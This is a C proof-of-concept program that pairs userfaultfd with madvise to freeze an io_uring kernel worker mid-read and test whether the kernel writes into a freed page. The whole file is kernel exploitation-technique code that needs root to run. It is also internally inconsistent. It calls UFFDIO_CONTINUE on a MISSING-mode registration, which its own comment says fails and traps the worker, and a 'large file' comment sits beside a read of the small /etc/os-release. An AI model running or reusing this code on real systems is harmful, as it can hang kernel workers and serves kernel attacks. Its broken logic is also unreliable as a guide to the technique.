#define _GNU_SOURCE
#include <linux/userfaultfd.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <liburing.h>

// NOTE: need to run using sudo to see effects
// gcc -o freeze_io_uring freeze_io_uring.c -luring -lpthread
// traps kernel mworker due to ioctl failing

void *addr;
size_t page_size;

static void *fault_handler_thread(void *arg) {
    long uffd = (long)arg;
    struct uffd_msg msg;
    struct uffdio_continue uffdio_continue;

    if (read(uffd, &msg, sizeof(msg)) > 0) {
        if (msg.event == UFFD_EVENT_PAGEFAULT) {
            printf("\ntrapped at: %p\n", (void*)msg.arg.pagefault.address);

            // MADV_DONTNEED evicts ppage but keep virtual memory area and uffd alive
            printf("madvise evicts physical page\n");
            if (madvise(addr, page_size, MADV_DONTNEED) == -1) {
                perror("madvise failed");
            }

            // let kernel keep going, if io_uring doesn't check valid page then wrote to freed page
            uffdio_continue.range.start = msg.arg.pagefault.address & ~(page_size - 1);
            uffdio_continue.range.len = page_size;
            uffdio_continue.mapped = 0;

            printf("resuming kernel worker\n");
            if (ioctl(uffd, UFFDIO_CONTINUE, &uffdio_continue) == -1) {
                perror("ioctl(UFFDIO_CONTINUE) failed");
            }
            printf("check dmesg.\n");
        }
    }
    return NULL;
}

int main() {
    int uffd, fd;
    struct uffdio_api uffdio_api = { .api = UFFD_API, .features = 0 };
    struct uffdio_register uffdio_register;
    struct io_uring ring;
    pthread_t thr;
    page_size = sysconf(_SC_PAGESIZE);

    // setup page-aligned mapping
    addr = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    // if anything touches this address then freeze and go to handler thread
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC);
    ioctl(uffd, UFFDIO_API, &uffdio_api);

    uffdio_register.range.start = (unsigned long)addr;
    uffdio_register.range.len = page_size;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    ioctl(uffd, UFFDIO_REGISTER, &uffdio_register);

    pthread_create(&thr, NULL, fault_handler_thread, (void *)(long)uffd);

    // use large file to not activate cache
    io_uring_queue_init(8, &ring, 0);
    fd = open("/etc/os-release", O_RDONLY);

    printf("submitted io_uring read...\n");
    struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
    io_uring_prep_read(sqe, fd, addr, 10, 0);
    io_uring_submit(&ring);

    // wait for threads to finish
    pthread_join(thr, NULL);

    return 0;
}
